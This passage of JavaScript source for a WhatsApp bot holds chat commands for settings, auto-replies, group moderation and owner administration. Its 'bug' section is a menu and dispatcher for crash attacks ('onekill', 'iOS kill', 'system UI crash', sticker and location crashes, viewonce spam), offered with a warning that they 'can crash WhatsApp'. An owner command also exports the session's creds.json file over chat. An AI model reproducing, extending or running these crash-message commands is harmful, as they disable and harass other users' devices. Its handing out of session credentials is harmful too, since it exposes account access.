┃ *7* - Work Type: ${currentConfig.WORK_TYPE || config.WORK_TYPE}
┃ *8* - Delete Notify: ${currentConfig.DELETE_MESSAGE_NOTIFY || config.DELETE_MESSAGE_NOTIFY === 'on' ? '✅ ON' : '❌ OFF'}
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number to Toggle ⤵️ 」━╮
┃ *1-8* - Change setting
┃ *0* - RESET ALL
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Type ${prefix}setting 1-8 to change`;
        await sendImageWithMessage(socket, sender, logo, settingsMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      else if (repliedNumber === '0') {
        await sendImageWithMessage(socket, sender, logo, mainMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }
      return;
    }

    if (!command) return;

    try {
      const sanitized = (number || '').replace(/[^0-9]/g, '');
      const userConfig = await loadUserConfigFromMongo(sanitized) || {};

      if (!isOwner) {
        const workType = userConfig.WORK_TYPE || 'public';
        if (workType === "private") return;
        if (isGroup && workType === "inbox") return;
        if (!isGroup && workType === "groups") return;
      }

      const botName = userConfig.botName || BOT_NAME_FANCY;
      const logo = userConfig.logo || config.RCD_IMAGE_PATH;

      // ==================== BUG COMMANDS ====================
      if (command === 'bug') {
        const bugType = args[0]?.toLowerCase();
        
        if (!bugType) {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}bug <type>\n\nTypes: onekill, iosk, sysui, list, loc, sticker, viewonce, mixed`, botName);
          return;
        }
        
        let resultMessage = "";
        
        try {
          switch (bugType) {
            case 'onekill':
              await sendImageWithMessage(socket, sender, logo, `💀 *ONE KILL BUG ACTIVATED!*`, botName);
              await oneKillCombo(socket, sender);
              resultMessage = "✅ One Kill combo completed!";
              await saveBugReport(sanitized, 'onekill', 'User activated one kill combo bug', 'high', from);
              break;
            case 'iosk':
              await sendImageWithMessage(socket, sender, logo, `📱 *IOS KILL BUG ACTIVATED!*`, botName);
              await iosKill(socket, sender, 10);
              resultMessage = "✅ iOS Kill completed!";
              await saveBugReport(sanitized, 'ioskill', 'User activated iOS kill bug', 'high', from);
              break;
            case 'sysui':
              await sendImageWithMessage(socket, sender, logo, `💥 *SYSTEM UI CRASH BUG!*`, botName);
              await sendSystemCrashMessage(socket, sender);
              resultMessage = "✅ System UI crash sent!";
              await saveBugReport(sanitized, 'sysui', 'User activated system UI crash bug', 'high', from);
              break;
            case 'list':
              await sendImageWithMessage(socket, sender, logo, `📋 *LIST MESSAGE CRASH!*`, botName);
              await sendListMessage(socket, sender);
              resultMessage = "✅ List message crash sent!";
              await saveBugReport(sanitized, 'list', 'User activated list message crash bug', 'medium', from);
              break;
            case 'loc':
              await sendImageWithMessage(socket, sender, logo, `📍 *LOCATION CRASH BUG!*`, botName);
              await sendLiveLocationMessage(socket, sender);
              resultMessage = "✅ Location crash sent!";
              await saveBugReport(sanitized, 'location', 'User activated location crash bug', 'medium', from);
              break;
            case 'sticker':
              await sendImageWithMessage(socket, sender, logo, `🖼️ *STICKER CRASH BUG!*`, botName);
              await blackening(socket, sender, force2);
              resultMessage = "✅ Sticker crash sent!";
              await saveBugReport(sanitized, 'sticker', 'User activated sticker crash bug', 'medium', from);
              break;
            case 'viewonce':
              await sendImageWithMessage(socket, sender, logo, `📷 *VIEWONCE SPAM BUG!*`, botName);
              await sendViewOnceMessages(socket, sender, 5);
              resultMessage = "✅ ViewOnce spam completed!";
              await saveBugReport(sanitized, 'viewonce', 'User activated viewonce spam bug', 'high', from);
              break;
            case 'mixed':
              await sendImageWithMessage(socket, sender, logo, `🔄 *MIXED CRASH BUG!*`, botName);
              await sendMixedMessages(socket, sender, 3);
              resultMessage = "✅ Mixed crash completed!";
              await saveBugReport(sanitized, 'mixed', 'User activated mixed crash bug', 'high', from);
              break;
            default:
              await sendImageWithMessage(socket, sender, logo, `❌ Unknown bug type. Use ${prefix}bugmenu`, botName);
              return;
          }
          
          if (resultMessage) {
            await sendImageWithMessage(socket, sender, logo, resultMessage, botName);
          }
          
          const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
          await sendImageWithMessage(socket, ownerJid, logo, `🐛 *BUG REPORT*\nType: ${bugType}\nFrom: ${senderNumber}\nTime: ${getSriLankaTimestamp()}`, botName);
          
        } catch (err) {
          console.error('Bug execution error:', err);
          await sendImageWithMessage(socket, sender, logo, `❌ Bug failed: ${err.message}`, botName);
        }
        return;
      }

      if (command === 'bugmenu') {
        const bugMenuText = `╭━━━━━━━━━━━━━❥❥❥
┃     *🐛 BUG MENU 🐛*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *🔴 ${prefix}bug onekill* - One Kill Combo
┃ *🟠 ${prefix}bug iosk* - iOS Kill
┃ *🟡 ${prefix}bug sysui* - System UI Crash
┃ *🟢 ${prefix}bug list* - List Crash
┃ *🔵 ${prefix}bug loc* - Location Crash
┃ *🟣 ${prefix}bug sticker* - Sticker Crash
┃ *⚫ ${prefix}bug viewonce* - ViewOnce Spam
┃ *🟤 ${prefix}bug mixed* - Mixed Crash
┃ *📋 ${prefix}bug list* - List Bug Reports
╰━━━━━━━━━━━━━❥❥❥

⚠️ *WARNING:* Can crash WhatsApp!
> ☠️ Use at your own risk!`;
        await sendImageWithMessage(socket, sender, logo, bugMenuText, botName);
        return;
      }

      if (command === 'bug' && args[0] === 'list') {
        const reports = await getBugReports(15);
        let reportText = `╭━━━━━━━━━━━━━❥❥❥\n┃ *📋 BUG REPORTS*\n╰━━━━━━━━━━━━━❥❥❥\n\n`;
        if (reports.length === 0) {
          reportText += `No bug reports yet.`;
        } else {
          reports.forEach((report, i) => {
            reportText += `${i+1}. ${report.bugType}\n   Status: ${report.status}\n   Time: ${moment(report.timestamp).tz('Asia/Colombo').format('MM/DD HH:mm')}\n\n`;
          });
        }
        reportText += `\n> ☠️ Total: ${reports.length} reports`;
        await sendImageWithMessage(socket, sender, logo, reportText, botName);
        return;
      }

      // ==================== AUTO REPLY COMMANDS ====================
      if (command === 'setreply') {
        const input = args.join(' ');
        if (!input.includes('|')) {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}setreply trigger|response\nExample: ${prefix}setreply hello|Hi there!`, botName);
          return;
        }
        const [trigger, response] = input.split('|');
        if (!trigger || !response) {
          await sendImageWithMessage(socket, sender, logo, `❌ Both trigger and response required`, botName);
          return;
        }
        await addAutoReply(from, trigger.trim(), response.trim(), 'text');
        await sendImageWithMessage(socket, sender, logo, `✅ Auto reply added!\nTrigger: ${trigger}\nResponse: ${response}`, botName);
        return;
      }

      if (command === 'delreply') {
        const trigger = args.join(' ');
        if (!trigger) {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}delreply <trigger>`, botName);
          return;
        }
        await removeAutoReply(from, trigger);
        await sendImageWithMessage(socket, sender, logo, `✅ Auto reply removed for trigger: ${trigger}`, botName);
        return;
      }

      if (command === 'listreply') {
        const replies = await getAutoReplies(from);
        if (replies.length === 0) {
          await sendImageWithMessage(socket, sender, logo, `📋 No auto replies set for this chat.`, botName);
        } else {
          let listText = `📋 *AUTO REPLIES*\n\n`;
          replies.forEach((reply, i) => {
            listText += `${i+1}. *${reply.trigger}* → ${reply.response}\n`;
          });
          await sendImageWithMessage(socket, sender, logo, listText, botName);
        }
        return;
      }

      // ==================== SETTINGS COMMANDS ====================
      if (command === 'setting') {
        const option = args[0];
        const currentConfig = await loadUserConfigFromMongo(sanitized) || {};
        
        if (!option) {
          const settingsPanel = `╭━━━━━━━━━━━━━❥❥❥
┃     *⚙️ SETTINGS PANEL*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *1* - Auto View Status: ${currentConfig.AUTO_VIEW_STATUS || config.AUTO_VIEW_STATUS === 'true' ? '✅ ON' : '❌ OFF'}
┃ *2* - Auto Like Status: ${currentConfig.AUTO_LIKE_STATUS || config.AUTO_LIKE_STATUS === 'true' ? '✅ ON' : '❌ OFF'}
┃ *3* - Auto Recording: ${currentConfig.AUTO_RECORDING || config.AUTO_RECORDING === 'true' ? '✅ ON' : '❌ OFF'}
┃ *4* - Auto Typing: ${currentConfig.AUTO_TYPING || config.AUTO_TYPING === 'true' ? '✅ ON' : '❌ OFF'}
┃ *5* - Auto Read Msg: ${currentConfig.AUTO_READ_MESSAGE || config.AUTO_READ_MESSAGE}
┃ *6* - Anti Call: ${currentConfig.ANTI_CALL || config.ANTI_CALL === 'on' ? '✅ ON' : '❌ OFF'}
┃ *7* - Work Type: ${currentConfig.WORK_TYPE || config.WORK_TYPE}
┃ *8* - Delete Notify: ${currentConfig.DELETE_MESSAGE_NOTIFY || config.DELETE_MESSAGE_NOTIFY === 'on' ? '✅ ON' : '❌ OFF'}
┃ *9* - Bot Name: ${currentConfig.botName || botName}
┃ *10* - Prefix: ${currentConfig.PREFIX || prefix}
┃ *0* - RESET ALL
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Type ${prefix}setting <number> to change`;
          await sendImageWithMessage(socket, sender, logo, settingsPanel, botName);
          return;
        }
        
        const settingsMap = {
          '1': { key: 'AUTO_VIEW_STATUS', options: ['true', 'false'] },
          '2': { key: 'AUTO_LIKE_STATUS', options: ['true', 'false'] },
          '3': { key: 'AUTO_RECORDING', options: ['true', 'false'] },
          '4': { key: 'AUTO_TYPING', options: ['true', 'false'] },
          '5': { key: 'AUTO_READ_MESSAGE', options: ['all', 'cmd', 'off'] },
          '6': { key: 'ANTI_CALL', options: ['on', 'off'] },
          '7': { key: 'WORK_TYPE', options: ['public', 'private', 'inbox', 'groups'] },
          '8': { key: 'DELETE_MESSAGE_NOTIFY', options: ['on', 'off'] }
        };
        
        if (settingsMap[option]) {
          const setting = settingsMap[option];
          const currentValue = currentConfig[setting.key] || config[setting.key];
          const currentIndex = setting.options.indexOf(currentValue);
          const newValue = setting.options[(currentIndex + 1) % setting.options.length];
          currentConfig[setting.key] = newValue;
          await setUserConfigInMongo(sanitized, currentConfig);
          await sendImageWithMessage(socket, sender, logo, `✅ ${setting.key}: *${newValue === 'true' ? 'ON' : newValue === 'false' ? 'OFF' : newValue}*`, botName);
        }
        else if (option === '9') {
          await sendImageWithMessage(socket, sender, logo, `📝 Send new bot name:`, botName);
          const replyHandler = async (replyMsg) => {
            const replyBody = replyMsg.message?.conversation || replyMsg.message?.extendedTextMessage?.text;
            if (replyBody && replyMsg.key.remoteJid === sender && !replyBody.startsWith(prefix)) {
              currentConfig.botName = replyBody;
              await setUserConfigInMongo(sanitized, currentConfig);
              await sendImageWithMessage(socket, sender, logo, `✅ Bot name: *${replyBody}*`, replyBody);
              socket.ev.off('messages.upsert', replyHandler);
            }
          };
          socket.ev.on('messages.upsert', replyHandler);
          setTimeout(() => socket.ev.off('messages.upsert', replyHandler), 30000);
        }
        else if (option === '10') {
          await sendImageWithMessage(socket, sender, logo, `📝 Send new prefix (1 char):`, botName);
          const replyHandler = async (replyMsg) => {
            const replyBody = replyMsg.message?.conversation || replyMsg.message?.extendedTextMessage?.text;
            if (replyBody && replyBody.length === 1 && replyMsg.key.remoteJid === sender) {
              currentConfig.PREFIX = replyBody;
              await setUserConfigInMongo(sanitized, currentConfig);
              await sendImageWithMessage(socket, sender, logo, `✅ Prefix: *${replyBody}*`, botName);
              socket.ev.off('messages.upsert', replyHandler);
            }
          };
          socket.ev.on('messages.upsert', replyHandler);
          setTimeout(() => socket.ev.off('messages.upsert', replyHandler), 30000);
        }
        else if (option === '0') {
          await setUserConfigInMongo(sanitized, {});
          await sendImageWithMessage(socket, sender, logo, `✅ *ALL SETTINGS RESET*`, botName);
        }
        return;
      }

      // ==================== OWNER COMMANDS ====================
      if (command === 'shutdown' && isOwner) {
        await sendImageWithMessage(socket, sender, logo, `🔄 Shutting down...`, botName);
        process.exit(0);
      }

      if (command === 'restart' && isOwner) {
        await sendImageWithMessage(socket, sender, logo, `🔄 Restarting...`, botName);
        exec(`pm2 restart ${process.env.PM2_NAME || 'pair-bot'}`);
      }

      if (command === 'broadcast' && isOwner) {
        const broadcastMsg = args.join(' ');
        if (!broadcastMsg) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide message to broadcast`, botName);
          return;
        }
        const allNumbers = await getAllNumbersFromMongo();
        let successCount = 0;
        for (const num of allNumbers) {
          const sock = activeSockets.get(num);
          if (sock) {
            try {
              const userJid = jidNormalizedUser(sock.user.id);
              await sendImageWithMessage(sock, userJid, logo, `📢 *BROADCAST*\n\n${broadcastMsg}`, botName);
              successCount++;
            } catch (e) {}
          }
        }
        await sendImageWithMessage(socket, sender, logo, `✅ Broadcast sent to ${successCount} sessions`, botName);
      }

      if (command === 'addadmin' && isOwner) {
        const adminJid = args[0];
        if (!adminJid) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide JID: ${prefix}addadmin 947xxxxxxxx`, botName);
          return;
        }
        const formattedJid = adminJid.includes('@') ? adminJid : `${adminJid.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        await addAdminToMongo(formattedJid);
        await sendImageWithMessage(socket, sender, logo, `✅ Added ${formattedJid} as admin`, botName);
      }

      if (command === 'removeadmin' && isOwner) {
        const adminJid = args[0];
        if (!adminJid) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide JID`, botName);
          return;
        }
        const formattedJid = adminJid.includes('@') ? adminJid : `${adminJid.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
        await removeAdminFromMongo(formattedJid);
        await sendImageWithMessage(socket, sender, logo, `✅ Removed ${formattedJid}`, botName);
      }

      if (command === 'listadmin') {
        const admins = await loadAdminsFromMongo();
        let adminList = `📋 *ADMIN LIST*\n\n`;
        if (admins.length === 0) adminList += `No admins found`;
        else admins.forEach((admin, i) => { adminList += `${i + 1}. ${admin}\n`; });
        await sendImageWithMessage(socket, sender, logo, adminList, botName);
      }

      if (command === 'getsession' && isOwner) {
        const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
        const credsPath = path.join(sessionPath, 'creds.json');
        if (fs.existsSync(credsPath)) {
          const creds = fs.readFileSync(credsPath);
          await socket.sendMessage(sender, { document: creds, mimetype: 'application/json', fileName: 'creds.json' });
        } else {
          await sendImageWithMessage(socket, sender, logo, `❌ Session not found`, botName);
        }
      }

      if (command === 'delsession' && isOwner) {
        const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
        if (fs.existsSync(sessionPath)) {
          fs.removeSync(sessionPath);
          await sendImageWithMessage(socket, sender, logo, `✅ Session deleted`, botName);
        } else {
          await sendImageWithMessage(socket, sender, logo, `❌ Session not found`, botName);
        }
      }

      if (command === 'totalhit' && isOwner) {
        const totalReports = (await getBugReports()).length;
        const totalSessions = activeSockets.size;
        await sendImageWithMessage(socket, sender, logo, `📊 *STATS*\nTotal Bugs: ${totalReports}\nActive Sessions: ${totalSessions}`, botName);
      }

      // ==================== GROUP COMMANDS ====================
      if (command === 'kick' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length === 0) {
          await sendImageWithMessage(socket, sender, logo, `❌ Tag user to kick`, botName);
          return;
        }
        for (const user of mentioned) {
          if (user === `${botNumber}@s.whatsapp.net`) continue;
          await socket.groupParticipantsUpdate(from, [user], 'remove');
        }
        await sendImageWithMessage(socket, sender, logo, `✅ Kicked ${mentioned.length} user(s)`, botName);
      }

      if (command === 'add' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        const numberToAdd = args[0]?.replace(/[^0-9]/g, '');
        if (!numberToAdd) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide number: ${prefix}add 947xxxxxxxx`, botName);
          return;
        }
        await socket.groupParticipantsUpdate(from, [`${numberToAdd}@s.whatsapp.net`], 'add');
        await sendImageWithMessage(socket, sender, logo, `✅ Added ${numberToAdd}`, botName);
      }

      if (command === 'promote' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length === 0) {
          await sendImageWithMessage(socket, sender, logo, `❌ Tag user to promote`, botName);
          return;
        }
        for (const user of mentioned) await socket.groupParticipantsUpdate(from, [user], 'promote');
        await sendImageWithMessage(socket, sender, logo, `✅ Promoted ${mentioned.length} user(s)`, botName);
      }

      if (command === 'demote' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
        if (mentioned.length === 0) {
          await sendImageWithMessage(socket, sender, logo, `❌ Tag user to demote`, botName);
          return;
        }
        for (const user of mentioned) await socket.groupParticipantsUpdate(from, [user], 'demote');
        await sendImageWithMessage(socket, sender, logo, `✅ Demoted ${mentioned.length} user(s)`, botName);
      }

      if (command === 'tagall' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        const groupMetadata = await socket.groupMetadata(from);
        let mentions = [];
        let tagText = `📢 *TAG ALL* - ${groupMetadata.participants.length} members\n\n`;
        for (const participant of groupMetadata.participants) {
          mentions.push(participant.id);
          tagText += `• @${participant.id.split('@')[0]}\n`;
        }
        await socket.sendMessage(from, { text: tagText, mentions }, { quoted: msg });
      }

      if (command === 'hidetag' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        const groupMetadata = await socket.groupMetadata(from);
        const mentions = groupMetadata.participants.map(a => a.id);
        await socket.sendMessage(from, { text: args.join(' ') || ' ', mentions }, { quoted: msg });
      }

      if (command === 'leave' && isGroup && isOwner) {
        await sendImageWithMessage(socket, sender, logo, `👋 Goodbye!`, botName);
        await delay(2000);
        await socket.groupLeave(from);
      }

      if (command === 'linkgc' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        const response = await socket.groupInviteCode(from);
        await sendImageWithMessage(socket, sender, logo, `🔗 https://chat.whatsapp.com/${response}`, botName);
      }

      if (command === 'revoke' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        await socket.groupRevokeInvite(from);
        await sendImageWithMessage(socket, sender, logo, `✅ Link reset successfully`, botName);
      }

      if (command === 'groupinfo' && isGroup) {
        const groupMetadata = await socket.groupMetadata(from);
        const groupAdmins = groupMetadata.participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin');
        const groupOwner = groupMetadata.owner || 'Unknown';
        const infoText = `╭━━━━━━━━━━━━━❥❥❥
┃     *📊 GROUP INFO*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *📛 Name:* ${groupMetadata.subject}
┃ *👥 Members:* ${groupMetadata.participants.length}
┃ *👑 Owner:* @${groupOwner.split('@')[0]}
┃ *👮 Admins:* ${groupAdmins.length}
┃ *📅 Created:* ${new Date(groupMetadata.creation * 1000).toLocaleDateString()}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Group Information`;
        const adminMentions = groupAdmins.map(a => a.id);
        await sendImageWithMessage(socket, sender, logo, infoText, botName, adminMentions);
      }

      if (command === 'group' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!(await isBotAdmin(socket, from))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Bot not admin`, botName);
          return;
        }
        if (args[0] === 'close') {
          await socket.groupSettingUpdate(from, 'announcement');
          await sendImageWithMessage(socket, sender, logo, `✅ Group closed (only admins can send)`, botName);
        } else if (args[0] === 'open') {
          await socket.groupSettingUpdate(from, 'not_announcement');
          await sendImageWithMessage(socket, sender, logo, `✅ Group opened (all members can send)`, botName);
        } else {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}group open/close`, botName);
        }
      }

      if (command === 'setname' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!args.join(' ')) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide name`, botName);
          return;
        }
        await socket.groupUpdateSubject(from, args.join(' '));
        await sendImageWithMessage(socket, sender, logo, `✅ Group name updated`, botName);
      }

      if (command === 'setdesc' && isGroup) {
        if (!isOwner && !(await isUserAdmin(socket, from, nowsender))) {
          await sendImageWithMessage(socket, sender, logo, `❌ Admin only`, botName);
          return;
        }
        if (!args.join(' ')) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide description`, botName);
          return;
        }
        await socket.groupUpdateDescription(from, args.join(' '));
        await sendImageWithMessage(socket, sender, logo, `✅ Group description updated`, botName);
      }

      // ==================== MAIN COMMANDS ====================
      if (command === 'menu' || command === 'help') {
        const mainMenu = `╭━━━━━━━━━━━━━❥❥❥
┃     *🏠 MAIN MENU*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *👑 Owner:* ${config.OWNER_NAME}
┃ *📌 Version:* ${config.BOT_VERSION}
┃ *⚡ Commands:* 50+
┃ *🔧 Prefix:* [ ${prefix} ]
┃ *🟢 Active Bots:* ${activeSockets.size}
┃ *🐛 Bugs:* 8 Types
╰━━━━━━━━━━━━━❥❥❥
╭━「 Reply Number ⤵️ 」━╮
┃ *1* - OWNER MENU
┃ *2* - GROUP MENU
┃ *3* - BUG MENU 🐛
┃ *4* - AUTO REPLY MENU
┃ *5* - TOOLS MENU
┃ *6* - SETTINGS
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Type ${prefix}setting to change settings`;
        await sendImageWithMessage(socket, sender, logo, mainMenu, botName);
        numberReplyTracker.set(senderNumber, Date.now());
      }

      if (command === 'alive' || command === 'ping') {
        const start = Date.now();
        const latency = Date.now() - start;
        const uptime = runtime(process.uptime());
        const aliveText = `╭━━━━━━━━━━━━━❥❥❥
┃     *🤖 BOT ALIVE*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *📄 Bot:* ${botName}
┃ *🥷 Owner:* ${config.OWNER_NAME}
┃ *🧬 Version:* ${config.BOT_VERSION}
┃ *⚡ Ping:* ${latency}ms
┃ *⏱️ Uptime:* ${uptime}
┃ *✒️ Prefix:* ${prefix}
┃ *🐛 Bugs:* 8 Types
╰━━━━━━━━━━━━━❥❥❥

> ☠️ Bot is Active!`;
        await sendImageWithMessage(socket, sender, logo, aliveText, botName);
      }

      if (command === 'system') {
        const systemOs = require('os');
        const sysText = `╭━━━━━━━━━━━━━❥❥❥
┃     *🖥️ SYSTEM INFO*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *🧸 OS:* ${systemOs.type()} ${systemOs.release()}
┃ *📡 Platform:* ${systemOs.platform()}
┃ *🧠 CPU Cores:* ${systemOs.cpus().length}
┃ *💾 Memory:* ${(systemOs.totalmem() / 1024 / 1024 / 1024).toFixed(2)} GB
┃ *🤖 Bot:* ${botName}
┃ *🐛 Bug Reports:* ${(await getBugReports()).length}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ System Information`;
        await sendImageWithMessage(socket, sender, logo, sysText, botName);
      }

      if (command === 'getdp') {
        let targetJid = sender;
        if (args[0]) {
          const argNumber = args[0].replace(/[^0-9]/g, '');
          if (argNumber) targetJid = `${argNumber}@s.whatsapp.net`;
        }
        const ppUrl = await getUserProfilePicture(socket, targetJid);
        if (ppUrl) {
          await socket.sendMessage(sender, { image: { url: ppUrl }, caption: `📸 Profile Picture` }, { quoted: msg });
        } else {
          await sendImageWithMessage(socket, sender, logo, `❌ No profile picture found`, botName);
        }
      }

      if (command === 'about') {
        const targetNumber = args[0]?.replace(/[^0-9]/g, '');
        if (!targetNumber) {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}about 947xxxxxxxx`, botName);
          return;
        }
        const targetJid = `${targetNumber}@s.whatsapp.net`;
        try {
          const statusData = await socket.fetchStatus(targetJid);
          const aboutText = `╭━━━━━━━━━━━━━❥❥❥
┃     *ℹ️ ABOUT*
╰━━━━━━━━━━━━━❥❥❥
╭━━━━━━━━━━━━━❥❥❥
┃ *📞 Number:* ${targetNumber}
┃ *📝 About:* ${statusData.status || 'No status'}
╰━━━━━━━━━━━━━❥❥❥

> ☠️ User Information`;
          await sendImageWithMessage(socket, sender, logo, aboutText, botName);
        } catch (error) {
          await sendImageWithMessage(socket, sender, logo, `❌ Failed to fetch about`, botName);
        }
      }

      if (command === 'chr') {
        const q = args.join(' ').trim();
        if (!q.includes(',')) {
          await sendImageWithMessage(socket, sender, logo, `❌ Usage: ${prefix}chr channel_post_link,emoji`, botName);
          return;
        }
        const parts = q.split(',');
        let channelLink = parts[0].trim();
        const reactEmoji = parts[1].trim();
        let channelJid = null;
        let messageId = null;
        const linkMatch = channelLink.match(/channel\/([a-zA-Z0-9]+)\/([a-zA-Z0-9]+)/);
        if (linkMatch) {
          channelJid = `${linkMatch[1]}@newsletter`;
          messageId = linkMatch[2];
        } else {
          const directMatch = channelLink.match(/(\d+@newsletter)\/(.+)/);
          if (directMatch) {
            channelJid = directMatch[1];
            messageId = directMatch[2];
          }
        }
        if (!channelJid || !messageId) {
          await sendImageWithMessage(socket, sender, logo, `❌ Invalid channel post link.`, botName);
          return;
        }
        try {
          if (typeof socket.newsletterReactMessage === 'function') {
            await socket.newsletterReactMessage(channelJid, messageId.toString(), reactEmoji);
            await sendImageWithMessage(socket, sender, logo, `✅ Reaction added: ${reactEmoji}`, botName);
          } else {
            await sendImageWithMessage(socket, sender, logo, `❌ Newsletter reaction not supported`, botName);
          }
        } catch (e) {
          await sendImageWithMessage(socket, sender, logo, `❌ Failed to react: ${e.message || e}`, botName);
        }
      }

      if (command === 'follow' && isOwner) {
        const newsletterJid = args[0];
        if (!newsletterJid) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide JID: ${prefix}follow 120363334838967293@newsletter`, botName);
          return;
        }
        await addNewsletterToMongo(newsletterJid, args.slice(1));
        if (typeof socket.newsletterFollow === 'function') await socket.newsletterFollow(newsletterJid);
        await sendImageWithMessage(socket, sender, logo, `✅ Following: ${newsletterJid}`, botName);
      }

      if (command === 'unfollow' && isOwner) {
        const newsletterJid = args[0];
        if (!newsletterJid) {
          await sendImageWithMessage(socket, sender, logo, `❌ Provide JID`, botName);
          return;
        }
        await removeNewsletterFromMongo(newsletterJid);
        if (typeof socket.newsletterUnfollow === 'function') await socket.newsletterUnfollow(newsletterJid);
        await sendImageWithMessage(socket, sender, logo, `✅ Unfollowed: ${newsletterJid}`, botName);
      }

      if (command === 'settingpassword') {
        try {
          const password = generateSettingPassword();
          await setSettingPasswordInMongo(sanitized, password);
          await sendImageWithMessage(socket, sender, logo, `🔐 *SETTING PASSWORD*\n\nPassword: ${password}\n\nUse this to login to web panel`, botName);
        } catch (e) {
          await sendImageWithMessage(socket, sender, logo, `❌ Failed: ${e.message}`, botName);
        }
      }

    } catch (err) {
      console.error('Command error:', err);
      try {
        await sendImageWithMessage(socket, sender, config.RCD_IMAGE_PATH, `❌ Error: ${err.message}`, BOT_NAME_FANCY);
      } catch (e) {}
    }
  });
}

// ==================== STATUS HANDLERS ====================

async function setupStatusHandlers(socket, sessionNumber) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;

    try {
      let userEmojis = config.AUTO_LIKE_EMOJI;
      let autoViewStatus = config.AUTO_VIEW_STATUS;
      let autoLikeStatus = config.AUTO_LIKE_STATUS;
      let autoRecording = config.AUTO_RECORDING;

      if (sessionNumber) {
        const userConfig = await loadUserConfigFromMongo(sessionNumber) || {};
        if (userConfig.AUTO_LIKE_EMOJI && Array.isArray(userConfig.AUTO_LIKE_EMOJI) && userConfig.AUTO_LIKE_EMOJI.length > 0) {
          userEmojis = userConfig.AUTO_LIKE_EMOJI;
        }
        if (userConfig.AUTO_VIEW_STATUS !== undefined) autoViewStatus = userConfig.AUTO_VIEW_STATUS;
        if (userConfig.AUTO_LIKE_STATUS !== undefined) autoLikeStatus = userConfig.AUTO_LIKE_STATUS;
